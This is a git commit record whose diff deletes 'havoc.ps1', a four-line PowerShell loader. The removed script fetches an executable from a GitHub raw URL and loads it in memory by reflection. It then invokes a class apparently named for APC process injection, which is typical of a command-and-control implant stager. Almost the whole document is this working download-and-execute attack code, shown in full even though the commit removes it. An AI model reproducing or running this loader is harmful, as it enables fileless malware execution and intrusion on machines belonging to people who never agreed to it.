249248e2cb4010b10021babd007cbcbd2cd50c72
Amarjit Labhuram <amarjit.labhuram@gmail.com>
2023-07-17 10:06:33 +0300

    Delete havoc.ps1

--- havoc.ps1
+++
@@ -1,4 +0,0 @@
-$bytes = (Invoke-WebRequest -useb "https://github.com/chr0n1k/AL2021/blob/main/program1_donutf7_havoc.exe?raw=true").Content;
-$assembly = [System.Reflection.Assembly]::Load($bytes);
-$entryPointMethod = $assembly.GetType('QUserAPCProcessInjection.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
-$entryPointMethod.Invoke($null, (, [string[]] ('', '')));
